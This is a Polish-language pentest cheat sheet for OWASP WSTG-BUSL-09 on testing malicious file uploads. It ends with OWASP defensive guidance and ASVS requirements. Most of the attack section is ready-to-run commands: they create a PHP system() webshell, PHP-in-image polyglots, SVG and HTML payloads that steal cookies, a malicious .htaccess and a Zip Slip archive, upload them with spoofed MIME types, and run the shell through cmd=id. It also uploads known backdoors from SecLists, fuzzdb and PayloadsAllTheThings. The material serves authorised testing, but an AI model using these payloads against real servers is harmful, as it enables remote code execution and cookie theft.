# WSTG-BUSL-09 — Test Upload of Malicious Files

## Cele

- Przetestowac upload zlosliwych plikow
- Sprawdzic zabezpieczenia przed webshellami i malware

## KOMENDY

### Upload PHP webshell

```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
curl -v -X POST TARGET/api/upload -F "file=@/tmp/shell.php;type=image/jpeg"

```

### Upload PHP webshell z MIME type bypass

```bash
curl -v -X POST TARGET/api/upload -F "file=@/tmp/shell.php;type=image/jpeg" -H "Content-Type: multipart/form-data"

```

### Upload polyglot (GIF + PHP)

```bash
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > /tmp/polyglot.php.gif
curl -v -X POST TARGET/api/upload -F "file=@/tmp/polyglot.php.gif;type=image/gif"

```

### Upload polyglot (JPEG + PHP)

```bash
printf '\xff\xd8\xff\xe0<?php system($_GET["cmd"]); ?>' > /tmp/polyglot.php.jpg
curl -v -X POST TARGET/api/upload -F "file=@/tmp/polyglot.php.jpg;type=image/jpeg"

```

### Upload SVG z XSS

```bash
echo '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>' > /tmp/xss.svg
curl -v -X POST TARGET/api/upload -F "file=@/tmp/xss.svg;type=image/svg+xml"

```

### Upload HTML z JavaScript

```bash
echo '<html><body><script>alert(document.cookie)</script></body></html>' > /tmp/xss.html
curl -v -X POST TARGET/api/upload -F "file=@/tmp/xss.html;type=text/html"

```

### Upload .htaccess (Apache)

```bash
echo 'AddType application/x-httpd-php .jpg' > /tmp/.htaccess
curl -v -X POST TARGET/api/upload -F "file=@/tmp/.htaccess;type=text/plain"

```

### Upload web.config (IIS)

```bash
# Pozwala na wykonanie kodu ASP w plikach .jpg:
curl -v -X POST TARGET/api/upload -F "file=@/tmp/web.config;type=text/xml"

```

### Testowanie EICAR (antivirus test file)

```bash
curl -v -X POST TARGET/api/upload -F "file=@/tmp/eicar.txt;type=text/plain"

```

### Upload ZIP z path traversal (Zip Slip)

```bash
# Tworzy ZIP z plikiem ../../../tmp/evil.php
# python3 -c "import zipfile; z=zipfile.ZipFile('/tmp/evil.zip','w'); z.writestr('../../../tmp/evil.php','<?php system(\"id\");?>'); z.close()"
curl -v -X POST TARGET/api/upload -F "file=@/tmp/evil.zip;type=application/zip"

```

### Testowanie dostepu do przeslanego webshella

```bash
curl -v "TARGET/uploads/shell.php?cmd=id"
curl -v "TARGET/uploads/shell.php?cmd=whoami"

```

## KOMENDY Z WORDLISTAMI

### SecLists - PHP Web Shells

```bash
# Desktop/WSTG/SecLists-master/Web-Shells/PHP/obfuscated-phpshell.php
# Desktop/WSTG/SecLists-master/Web-Shells/PHP/another-obfuscated-phpshell.php
# Desktop/WSTG/SecLists-master/Web-Shells/PHP/Dysco.php
curl -v -X POST TARGET/api/upload -F "file=@Desktop/WSTG/SecLists-master/Web-Shells/PHP/obfuscated-phpshell.php;type=image/jpeg"

```

### SecLists - lista znanych webshelli

```bash
# Desktop/WSTG/SecLists-master/Web-Shells/backdoor_list.txt
# Referencja do sprawdzenia czy serwer blokuje znane sygnatury webshelli

```

### fuzzdb - PHP backdoors

```bash
# Desktop/WSTG/fuzzdb-master/web-backdoors/php/cmd.php
# Desktop/WSTG/fuzzdb-master/web-backdoors/php/shell.php
# Desktop/WSTG/fuzzdb-master/web-backdoors/php/php-backdoor.php
# Desktop/WSTG/fuzzdb-master/web-backdoors/php/php-reverse-shell.php
curl -v -X POST TARGET/api/upload -F "file=@Desktop/WSTG/fuzzdb-master/web-backdoors/php/cmd.php;type=image/jpeg"
curl -v -X POST TARGET/api/upload -F "file=@Desktop/WSTG/fuzzdb-master/web-backdoors/php/shell.php;type=image/jpeg"

```

### fuzzdb - JSP backdoors

```bash
# Desktop/WSTG/fuzzdb-master/web-backdoors/jsp/
curl -v -X POST TARGET/api/upload -F "file=@Desktop/WSTG/fuzzdb-master/web-backdoors/jsp/cmd.jsp;type=image/jpeg" 2>/dev/null

```

### fuzzdb - ASP backdoors

```bash
# Desktop/WSTG/fuzzdb-master/web-backdoors/asp/
curl -v -X POST TARGET/api/upload -F "file=@Desktop/WSTG/fuzzdb-master/web-backdoors/asp/cmd.asp;type=image/jpeg" 2>/dev/null

```

### PayloadsAllTheThings - Upload Insecure Files

```bash
# PHP shells: Desktop/WSTG/PayloadsAllTheThings-master/Upload Insecure Files/Extension PHP/
# ASP shells: Desktop/WSTG/PayloadsAllTheThings-master/Upload Insecure Files/Extension ASP/
# HTML shells: Desktop/WSTG/PayloadsAllTheThings-master/Upload Insecure Files/Extension HTML/
curl -v -X POST TARGET/api/upload -F "file=@Desktop/WSTG/PayloadsAllTheThings-master/Upload Insecure Files/Extension PHP/shell.php;type=image/jpeg"
curl -v -X POST TARGET/api/upload -F "file=@Desktop/WSTG/PayloadsAllTheThings-master/Upload Insecure Files/Extension PHP/shell.phar;type=image/jpeg"

```

### PayloadsAllTheThings - EICAR test file

```bash
# Desktop/WSTG/PayloadsAllTheThings-master/Upload Insecure Files/EICAR/

```

### PayloadsAllTheThings - ImageMagick exploit

```bash
# Desktop/WSTG/PayloadsAllTheThings-master/Upload Insecure Files/Picture ImageMagick/

```

### PayloadsAllTheThings - Metadata payloads

```bash
# Desktop/WSTG/PayloadsAllTheThings-master/Upload Insecure Files/Picture Metadata/

```

### XSS via uploaded files (PayloadsAllTheThings)

```bash
# SVG XSS: Desktop/WSTG/PayloadsAllTheThings-master/XSS Injection/Files/SVG_XSS1.svg
curl -v -X POST TARGET/api/upload -F "file=@Desktop/WSTG/PayloadsAllTheThings-master/XSS Injection/Files/SVG_XSS1.svg;type=image/svg+xml"

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. W Burp Suite -> Repeater: modyfikuj zawartosc pliku zachowujac magic bytes
2. Testuj polyglot files (prawidlowy obrazek z wbudowanym kodem)
3. Sprawdz czy serwer skanuje pliki antywirusem (upload EICAR test file)
4. Sprawdz czy przeslane pliki sa przechowywane poza webroot
5. Sprawdz czy przeslane pliki sa serwowane z innej domeny (CDN)
6. Testuj czy przeslane pliki zachowuja oryginalna nazwe (path traversal)
7. Sprawdz Content-Type odpowiedzi przy pobieraniu przeslanych plikow
8. Testuj czy mozna nadpisac istniejace pliki przez upload


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — File_Upload_Cheat_Sheet.md

### Walidacja przesylanych plikow — wielowarstwowa

- **Rozszerzenie pliku**: allowlist dozwolonych rozszerzen (`.jpg`, `.png`, `.pdf`) — NIE denylist
- **MIME type**: sprawdz `Content-Type` header — ALE moze byc sfalszyowany
- **Magic bytes**: sprawdz pierwsze bajty pliku (np. `\xFF\xD8\xFF` = JPEG) — trudniejsze do obejscia
- **Zawartosc**: re-enkoduj obrazy (ImageMagick, PIL) — usun wbudowane payloady
- **Metadane**: usun EXIF, komentarze, metadane — moga zawierac code injection

### Przechowywanie plikow — bezpieczne

- Przechowuj pliki **POZA webroot** — brak bezposredniego dostepu przez URL
- **Zmien nazwe pliku**: losowa nazwa (UUID) — zapobiegaj path traversal i name collision
- **Osobna domena/CDN**: serwuj pliki z innej domeny — izoluj od glownej aplikacji (XSS protection)
- **Ogranicz uprawnienia**: pliki nie powinny miec execute permission
- **Skanuj antywirusem**: sprawdz pliki przed zapisaniem

### Typowe ataki przez upload

- **Web shell**: PHP/JSP/ASP shell upload → RCE na serwerze
- **Podwojne rozszerzenie**: `shell.php.jpg` — serwer moze interpretowac jako PHP
- **Null byte**: `shell.php%00.jpg` — starsza PHP obcina po null byte
- **Content-Type spoof**: ustawienie `image/jpeg` na pliku PHP
- **Polyglot**: prawidlowy obrazek z wbudowanym kodem PHP/JS
- **SVG XSS**: SVG z `<script>alert(1)</script>` — XSS przy wyswietlaniu
- **.htaccess upload**: `AddType application/x-httpd-php .jpg` — pliki JPG jako PHP
- **Zip Slip**: ZIP z path traversal (`../../../tmp/evil.php`)
- **ImageMagick exploit**: spreparowany obrazek wykorzystujacy CVE w ImageMagick

### Limity uploadu

- **Rozmiar pliku**: ustaw max rozmiar (np. 10 MB) — zapobiegaj DoS
- **Ilosc plikow**: ogranicz ilosc uploadow per uzytkownik/sesje
- **Rate limiting**: ogranicz czestotliwosc uploadow
- **Quota**: ogranicz calkowita przestrzen dyskowa per uzytkownik

## ROZSZERZENIA BURP SUITE

| Rozszerzenie | Opis | Link |
|---|---|---|
| Upload Scanner | Testy bezpieczenstwa uploadu z roznymi payloadami | [GitHub](https://github.com/modzero/mod0BurpUploadScanner) |

---

## Wskazówki ASVS

Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas testu.

### L1 (Podstawowy)

| ID | Sekcja | Wymaganie |
|---|---|---|
| V5.2.1 | File Upload and Content | Verify that the application will only accept files of a size which it can process without causing a loss of performance or a denial of service attack. |
| V5.2.2 | File Upload and Content | Verify that when the application accepts a file, either on its own or within an archive such as a zip file, it checks if the file extension matches an expected file extension and validates that the contents correspond to the type represented by the extension. This includes, but is not limited to, checking the initial 'magic bytes', performing image re-writing, and using specialized libraries for file content validation. For L1, this can focus just on files which are used to make specific business or security decisions. For L2 and up, this must apply to all files being accepted. |

### L2 (Standardowy)

| ID | Sekcja | Wymaganie |
|---|---|---|
| V5.4.3 | File Download | Verify that files obtained from untrusted sources are scanned by antivirus scanners to prevent serving of known malicious content. |

### L3 (Zaawansowany)

| ID | Sekcja | Wymaganie |
|---|---|---|
| V5.2.4 | File Upload and Content | Verify that a file size quota and maximum number of files per user are enforced to ensure that a single user cannot fill up the storage with too many files, or excessively large files. |
| V5.2.5 | File Upload and Content | Verify that the application does not allow uploading compressed files containing symlinks unless this is specifically required (in which case it will be necessary to enforce an allowlist of the files that can be symlinked to). |
| V5.2.6 | File Upload and Content | Verify that the application rejects uploaded images with a pixel size larger than the maximum allowed, to prevent pixel flood attacks. |
